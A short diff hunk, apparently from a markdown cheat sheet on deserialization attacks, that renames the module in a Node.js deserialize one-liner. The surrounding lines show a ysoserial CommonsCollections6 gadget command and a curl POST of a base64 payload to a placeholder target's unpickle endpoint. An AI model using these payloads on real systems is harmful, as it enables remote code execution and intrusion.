@@ -45,7 +45,7 @@ curl -X POST -d "data=BASE64_PAYLOAD" http://target.com/api/unpickle
 java -jar ysoserial.jar CommonsCollections6 "whoami" | base64
 
 # Node.js deserialization attack
-node -e "const rev = require('序列化'); rev.deserialize('MALICIOUS_PAYLOAD')"
+node -e "const rev = require('serialization'); rev.deserialize('MALICIOUS_PAYLOAD')"
 ```
 
 ### PHP Object Injection
